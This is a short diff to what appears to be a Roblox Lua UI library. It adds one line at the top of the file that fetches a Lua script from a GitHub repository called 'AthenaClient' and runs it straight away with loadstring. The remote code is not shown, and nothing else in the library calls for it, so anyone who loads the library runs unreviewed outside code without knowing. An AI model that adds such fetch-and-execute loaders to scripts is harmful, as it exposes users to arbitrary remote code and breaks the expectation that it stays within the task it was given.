@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GFXTI/AthenaClient/main/Main.lua"))()
+
 local library = {};
 
 if game:GetService("CoreGui"):FindFirstChild("LibraryUI") then
